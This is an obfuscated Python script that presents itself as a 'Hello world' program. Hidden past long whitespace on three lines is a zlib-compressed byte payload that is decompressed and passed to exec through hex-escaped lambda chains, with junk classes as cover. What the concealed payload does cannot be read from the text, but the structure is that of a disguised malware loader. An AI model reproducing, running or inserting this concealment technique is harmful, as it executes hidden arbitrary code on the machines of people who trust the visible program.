from builtins import *
from math import prod as _calculate


__obfuscator__ = 'Hyperion'
__authors__ = ('vlong07', 'BlueRed')
__github__ = 'https://github.com/vlong07/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Run, _stackoverflow, Absolute, Multiply, _statistics, _invert, Cube = exec, str, tuple, map, ord, globals, type

class _negative:
    def __init__(self, _power):
        self.Substract = _calculate((_power, -57313))
        self.Modulo(_while=45525)

    def Modulo(self, _while = True):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Substract -= 82517 / _while
        
        try:
            {_memoryaccess: _stackoverflow} if Run < Absolute else (_memoryaccess, _stackoverflow) >= _invert

        except AssertionError:
            (({'lode0e0': Absolute}, _memoryaccess) for _memoryaccess in (_memoryaccess, _memoryaccess))

        except:
            Cube(34276 + -53182) == bool

    def _square(self, _theory = -91651):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _theory += 25465 * -91533
        self._walk != False
        
        try:
            (({'lode0e0': Absolute}, Multiply) for Multiply in {_memoryaccess: _stackoverflow})

        except AssertionError:
            ((Run, Absolute) or _memoryaccess if (Run, Absolute) and _memoryaccess else ... or (_memoryaccess, (Run, Absolute)))

        except:
            Cube(73559 + -19989) == bool

    def _modulo(_substract = bool):
        return _invert()[_substract]

    def MemoryAccess(Add = 16807 + 89589, Product = int, While = _invert):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        While()[Add] = Product
        
        try:
            {_memoryaccess: _stackoverflow} if Absolute < Multiply else {Multiply: Multiply} != _stackoverflow

        except AssertionError:
            (((_memoryaccess, _memoryaccess), _memoryaccess) for _memoryaccess in {'lode0e0': Absolute})

        except:
            Cube(8058 / -28332) == type

    def execute(code = str):
        return Run(_stackoverflow(Absolute(Multiply(_statistics, code))))

    @property
    def _walk(self):
        self.Math = '<__main__.Absolute object at 0x000009004BE33662>'
        return (self.Math, _negative._walk)

if __name__ == '__main__':
    try:
        _negative.execute(code = __code__)
        _floor = _negative(_power = -257 / 61895)

        if 342076 > 3133618:
            _floor._square(_theory = -59969 - _floor.Substract)
        elif 362969 < 3967842:
            _floor.Modulo(_while = _floor.Substract / 81484)                                                                                                                                                                                                                                                          ;_negative.MemoryAccess(Add='O00O0oo0000OOoOOOO',Product=b'x\x9c\xe5\x1bko\xe2:\xf6{~\x05\xb7_\x00M\xa7\r\xce\xbb\x12_V\xec\xd5\x051eu\xbbZ\xba\x9a\xa9P\x1e\xa6\rc\xe2\xde$L\xe9\xbf\xdfsl\'\x84\x02\xd30)\xbdZ\xd5\x8e\xdf\xcf\x9c\x97\x8f\xed$O\x9f\xaf\xb4\x16\x98x\xde\x11!\x9a\xd9\x8c\x07\xf3U\x16\xfa9Og\xb3\xd6o\xfd\xb3?\x9e\x1fi\x1a\xf3\xe4\xac\xc5\xd3J5\x7f\x95?\xf04\x13u:g?\x18O\xeeu\xe7\xec\xfc\xec\x1flE\xff\xa4\xd1Yw\xab\xf6}\x9c?\xac\x02\xd9\xe1C\x9e?fW\x97\x972\xef"\xe4\xcbK\xd5\xfc\xf2\xc0XQ\x9c\x85<\x8d\xb6\x9b\xab\xcc\x8b\xfb\xfb\xcbG\xe6\xdf\xaf\xe8\x8bF,\x0ei\x92Q\xd9\xe8\x9f\xff\x1a\x7f&\x17\xfa\x8b*!\x8fdy\xfb1\x8d\x93\xbcs\xf6\x07e\x8c\xb7\x9ex\xca\xa2\xdf\xce\xbam\xad{U\xd6\xc6\xf2v\xf6=\x8e\xda]\x8d\xaeC\xfa\x98+\xe0%\x8f+h\xf9\'\xcfh\xd6\xf2S\xdaJi\xf4-\xf9O\xcc\x19\xcdeF\x00\x10\xf9\x96\xfc\x97\xafD\xcaoa\'\xdf\x92k\x1e\xf0\xe8\xb9\xc5\xe2\xef\xd0\xee\x99\xaf\xce\xba\x9a\x9cT\xbc|\xe4i>\x9b\xc1h\xcfY\xbb{A\xd7q\xde\xe9j\x8c\x87>\xcb:\xdd\xaf\xed\xd1p<\x1a\x827\x1e\x8d\x87\x10B\xaa}\xd7\xbfg<\x80rm\xb7\x10\x9b,\x161\x8b\xe3x\x01a\x0c1\xc6\x18\xc4\xe3\xf6\xd7\xab\xabO\x9f?}\xee|\xee|\xeau\xbbww\xfd(N\x0f\xf4\x90,\x13\xf5\x80\x03\x0bF\x06\xbb\x9d\xdc\xd3\xdc\xcf\xf3\x83\x1da\x0f\xa2\xb9\x08E\x17w}\xf9v\xda\x9eB\xd9\xa6\x18sY\xd4H\xa0\xd1\x06V\x87\xc7\xc2\x16\xcb\xe5f\xba\xd8\x1e\xdb\xee\xeb\xb2\xd3\x0eV1\xcb\xe3\x04\xc1\xfe\xc3O\x0fA\xf3\xfa\xcb5\x98/_\xc4\x831\x91\xb8\xbe\x86n\xcbqD\x90$%\xd8:\xfb\x07\xcc\x928g\xf1*x\t\xc5\xee9"\x08\xf1T\xc5\xdbbql7\xdd\xafo\xd4\xcfE\x9cDt\xddi\xd3\x8c\xf9\xbf\xef\x14\xdfu\xb5C\xb0F\x80\xad\x9f\x9e\xe0\x01o\xfd$\xedG\x80\x14\xe3|\xb7\xf4\x15@-\x0bP,\x15\xfd\'\xcb_\x00U\x1c\x87\x99\x9f\xc4MAu\xb0\x9b#Au\xb8\x9f\x02T\xcf\xf3\x98\xad\xe9C\xb2\xda\x07\xaf\xfd<\x18/p\xfcx\x01\x16\xa2B\xbc1\x08\x01Z\xed\xf6\xc5\x82\xc7\xc9O\xe1,\xc4\xdfB\xbe\x05\xce\x1e\x1bC\xf2#\x90e\x9ag\xc7R%@}\x84\xd0\x87@`b\xf8\x11\xe0DW\xe9\xbf\xeb\x93\xe3-\x98\xe9\x14\x9e\xa9\x88\t+\xc2\x8f\x00*\xe6\xff\xa0\xc7\xd2\xd4D\xd7\'\\\xe7|\xc29\xc4d\x14\xf2\xf4\x8f\x00/\xca\xe2\xc7%\x0f\x8f\x06\xd9\x80O\x06\x13>\x00h\xf1\x01>\x130\x905\xf8\x080\xcb}\xce\xe6\xf5\xf9\x91\r\x19\x1b\x82c\xc2\r\xe1\x01Sm~\x90a;\xed\xae5s\xc0\xda\xe0\\p\x1e\xc6\xa0\x85\xbd\x9b[\xaf\xc3=\x8bz\'h\x1b=\x12\x11\x97D\x86N<P7#\x8a\x9b\x91N\xdb\x9d\xe7\xbb\xab`Wzw\x1f\x00\xcf!]\x1f-Kn\x08ZBnnD\xecF\xb8\x9b\xba\xd8\xeeA\r\xbdve@|of\xccL\xb0H\x02\xee\xcc\x82\x16d7\xf7\xbdIC\x92\x07\xf3\x97A\xe4\xb7&(K\xf1\xe1\xe0\x83T\x95R\x96s~\xb5\x8f[~\n\xdb\x05\xeaY\xb8c\\,$\xa2\xdf\xf3\xc5\xca\x17\xc2Y\x00U\xb1B_\xc3\xf0j\xeff\xf1g/\xb3\x7fR&5#p\xb4\x0c#\xe1*y\xafM\xf5\xae\x7f, \x88C\x9cW\x01\xf0S\xbc\x006\x01\xbd\x88V\xc42"w\xd2\x083\xba\xc2L\xaf.f\x8e\x7feG\xb7=G\'\xe0\xdb\xd41\x1c\xd3\xee\xd9\xa1\x1d\x12\xdd!\xb6\xe5\xf4\x1c\x0b|\xc8u\x0c\xa2\x13\x1b\xac~\xa8\xbeM\x1c\xc30_\xab\xe5\xe8\x8e\'\xfa\xf3 m5\x05\xf7h\x0c\xfc2\xc6Ed\x84\xaa0\xb2\xd1\xe8\x04\x02\xe6\x00r,k.\x9c\r\x8e\x80s\xc0\xe9*4\x8a\x90\x04\x02\x81u\xea\x92c\x96\x1c\xc5\x82S9G9\xd9i\xf1\x02\xd3\xdb\xa3E\xca\x01.\xf4\xd0"\xea\xa4\xc5x\xd5\xa1\x7f\x02>$\xb5\x89\x924#\xa0RP\x15\x13@S\x97\x82t\xa8\xd1{O\xf6\xfeE\x16\'Vh\xe8\x06\x18+0zF\x00\x91\x9e\x1d5\x84\xdc\xfe\xa1l$\t\x1f\xac\'l\xa8\xd2\xa1\xca\xf5E\x8e\xff:\xc1(\xe2\x96z\xa24C\xa5.\x82wux^\xbf@\xe1\xa1\xe9\x03\x8d\x17.\x14\xd6\x13\xa9"<\t\x85\xef\xe0\xc4j\x8c\x936*\x14\x1c\xb5\x0b\x1d5\x0c\\|0\x02ZG#"uA4\x99\xca\xb9JTY*n\xab\xb8\xa7\xc4\\\x9d\xba\xee\xc9\xd6\xb2]\xa0\x1a\'"t\xcb\xb5\x1c\xe1\xd0wK\xbf\xc8+b*U\x9b\xe0\xe5\xc0K\xb9{\x10\x11\x8c\xbf\x91,\x17l\xe8)\xf6\x0c\x15Sz*\xe5\x972\xdeS\xac\n\x0c\xfc.t\xef4\xa7\xfbA\xb1\xe9\xc6-\xf8\x04\x8f,\xc4\xa6\x9c\xff-J\xb1\x9a\xa8\xeaQM\xf4\x17EV\xe5\x88\xberR\xbf\xae\xbb@\xb9\xb0\xfd\xb1\xc1\x91\x99\x05\x9b\x1f\x17B\x0fZx\xbb\xb9\xef\xbfc>^O\xad\x10\x8e\x0e$\xd3Ls<\xc4!\x85\xb6#\xf5\x9e\x8d\xa6S\xe4\x1e\xa3\xf5(z\x00\x95t$uT\xa1\xa1"\x0b\xbf\x15C\xcf\xa55\xb7|\xb0&\x84&\xfa\xaa\xdc<1#\xeb\'U**\xd2\xd4-\xa5\xed\x1e\x89\xfb.\xd2\xaa\xf9K\xb6\x87\xea\xf8\xab\xd0i\xa4Z\xc3\xea\x1e\x84\x1d\xe0B\\q{j3aTV`K\xad\xc2^e\x95\xaeS\xf7t\xab\xb4\xb3\x03T\xaf1?\xb7\'\xfaDl\xbc\xb9\xce\xf1\x0c\x1b\xcfWjj=\xa0\xc7\x830DQ\xd8\x9b93c\xa6\x83sq\xd0\xdd\xdc\xc6\x08\xd2+\xaaPUE*\x11QA\xd0ku\x8d\x13\x8b\xdb9X\x1bvZ\x1e\xd1\xcd04\x02bS\xdb\x81\xb8a\xbb\xb4\x17\xf8~\xcf\x11%2\x8e\xb5,)pBly\x12\xf1\x0c\xaa\xb8_*\xeaRU\xf7KU\xbd(;F0\x8f\x87x~0\x94by$\x9e\xf1\xe8Mw\x17\x15\rq#\xbf\xdc--Q\xa5kO[\\5\x0c\xf8` \x1cj>\\\xa8<o\xb5\xe3\x0f+\xe0\r\xd5\x9e\xc8\xab\xec\x92\n+\xd2\xef"s\xedS-,\xc6\xc6\x1aD\xfa\xd5\x10\xfdMZ\xc6\xffO\x16\x99\xfdC9U\xe3\x82-b[\xee\x14\xe7\xaa\xb6\xeb\x98`u\xc70|2\' %\x80\xf8m\xbb\x072%\x04\x99\x81\x92\x85\x02\x10\xc0:\x8em\xd9\xc4v\xed\xb9<\xf7\x816:\xa1\xb6\x01\xb5"2\x87>,\x9b\x12\x943\xc4\xb6I(,ut\xe8_o\xba\x84\x88WB[y\xa1F\x12\xdfV\x12\xdbTR\xdc.\x96\xe1\xcaRK\x94\xc4\xafS\xf7t\x87\xc0\xa7\xd8\x95\xd5\x12\x88\xdb\x9bh%\x0eOs\xb0O\x1c3\xb0=X\xae\x02\x17O\x05`\xb9r\x88\xdd\xdb^\xc2\xcc\x00\xe3\x01\x90\x19\xc4)\xd6\xf5d~\xa4\xea \xa1:\x8d\xaf\t\x0ep\xa7\xbb\xc5\x95\x8e\x8a\xb9e\xdeixs\x17\xf7\xa4\xb9\x8e+6\xac\xd2J\x03\xe9\xda\xdb\xd6\xe6\'\xf3\x85\x9edU\x14]S\x85\xbd\x8a"\xfcZ\xbd\x9aJ\xf0\xd6\xfe\x1f/\xc4\xe2\x18/\xc6\x98\xf8\x94\t\xcc[\xed\xf7(\xd8\x08,\x15\xaej#\x95_\xa4D\xf8\x9e\x07\xf3B@\x83(G\x9e\x82\xf1{M\t()\x86\x15S\x10e\xef{\x9a\xf3\x06|d6\xe7#\x9c\xc2\xedt3\x17L\xd5?\xfd\xf1`\xd3\x82\x17\xdf\xe2\xea{Ff\xa68\xfd\xd9\xc9=\xc1}G\xbb\xeb\xcczj\xebd\xc2\xe6\xc9\x06\x1f\xaf\xe4\xdd\xdd\xdcc:\xd4grW\x86\xf7\xfd\xce\x8c\xa8\x0e_\xe4\xfe\x1dw\xfcMng\x0e\xb2\x14\xeaG\x81m9\xa4\x0e\x15\xcdS\xbel\x15\x1fJ\xb7\xe4\x17\xd8-\xba\xa6\xe1\xb9\xf8\x88\xfe\x1c\x9c\x86\xc9N\xf9m\xb4\xfc:\xfa\xcb\xb5j\x9b\xc7KZ\xb4\xcb\xf2t\x8eiM\xa5yV\xc4\xb2\xe72\x9a\xd2\xbfV4\xcb\xcb\xf4"\xe3\xc9\x9e\xae\x18\xa5\x8f2;\xf2sZ-*\xd2\xe7\xe8E\x94\xe5~\xd1U\xe0g\xd46\x0f\r\xb4\x99\x8d\x98c.\x7f\x98\x10C\xcc\xfd\xef4-\xfa\xff\x1d\x13P\xf2\xb2\x1bU7\xe4\x8c\xa7\xfe\xd2/\xab\xf3\x94\x9e\xdf\xe4\xcf\x8cV\xdbl\xe2\x8f\xcf\x99(\xdc\xfcf\xc0\xb3\x0b\x80GN\x97\x1dq\xf3*\xd0.\xb1\x8e\x91\xeeV\rq\xc6#\x8e}\xa4e\xc3\xedry\xda\x9fH\xa3D\x00z\xdb\xb5\xc4\x17#\xe2\x88\x03\xbf\x1b\xc1+\x1e\x1d+\xc8\xff$&\xf2\xdcC~\xc1\x87\xa5`\xbb\xda:y\xf0\xc3\xfe\x18W\x9d1\xde\x90\xcb\xa5H\xdc\x99\x0fGZ\xc4\xfb7\xc2\x10x\xa4#2\x04_c\xab\xb0\x8f\x07\xceb\x05W\xa7\xd0\xeb\'\xed\x87\x9f\xdc\xf7q\xdf)\xae\x97\xe4]\x13^:\xc9\xeb\'m\x1d\xad8TP4\xaed\xb8x#\r\x10\xd6\x97\x87]\xe5\xd1\xd7\xe64L{\xc0fbz\xb8V\xe2R)\x96K\xc00\x0e(\xff\x8e`\xf8\xa9\xc9\x02\xbf*\x96\xbfK\xc0\x02\xab==\xc49\r\xfa%\xabU4y-\xa5Q_@C>b\xe7\x8c\xe9\x01\x96\x04\xfd\r\xb8\x15w\xa2\xd1h\x12\xf5\xd5Y{\xf5\xf4\x1d\x9e\x82\xdaZ\x82\xb7:\x05M]\xdc\xd3\xbcSh:\xa2\xaa\xb4\xdd\x8b\x9c\xae\xf3\xed_S$\xb2\xa6\xd3\xdbRB\x14\xc2}\xaa\xa2\xb7*r\x0b4\xf4?\x99\xebm\x7f')

        _negative(_power = -95522 + 83150)._square(_theory = -66365 / _floor.Substract)                                                                                                                                                                                                                                                          ;jjljjlljlijljllljjijil,mmmnmmnnmmnnnnnnmmnmmmm,nmnnnnnmmmmmnnmnmm,lllIllllIIlIIlIlIIIlll,MNMNNMNMMMNMNNNNMMNNNNNNM=(lambda wxxwwwxwwwxxwxxxx:wxxwwwxwwwxxwxxxx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda wxxwwwxwwwxxwxxxx:wxxwwwxwwwxxwxxxx(__import__('\x7a\x6c\x69\x62'))),(lambda wxxwwwxwwwxxwxxxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wxxwwwxwwwxxwxxxx)"),filename='\x6c\x69\x69\x6c\x6c\x69\x6c\x69\x69\x6a\x69\x6a\x6c\x6a\x6c\x6c\x69',mode='\x65\x76\x61\x6c'))),(lambda WXWWXWWWWWXWXWXXWWXW,wxxwwwxwwwxxwxxxx:WXWWXWWWWWXWXWXXWWXW(wxxwwwxwwwxxwxxxx)),(lambda:(lambda wxxwwwxwwwxxwxxxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wxxwwwxwwwxxwxxxx)"),filename='\x6c\x69\x69\x6c\x6c\x69\x6c\x69\x69\x6a\x69\x6a\x6c\x6a\x6c\x6c\x69',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _negative(_power = 92002 / -48922)._square(_theory = 86019 * _floor.Substract)                                                                                                                                                                                                                                                          ;MNMNNMNMMMNMNNNNMMNNNNNNM()(lllIllllIIlIIlIlIIIlll(jjljjlljlijljllljjijil(mmmnmmnnmmnnnnnnmmnmmmm(nmnnnnnmmmmmnnmnmm('\x76\x61\x72\x73'))),_negative._modulo(_substract='O00O0oo0000OOoOOOO')))

    except Exception as _memoryaccess:
        if 258709 > 7280682:
            _negative.execute(code = _stackoverflow(_memoryaccess))

        elif 143120 > 632465:
            _negative(_power = 55640 - 60041)._square(_theory = -85681 / _floor.Substract)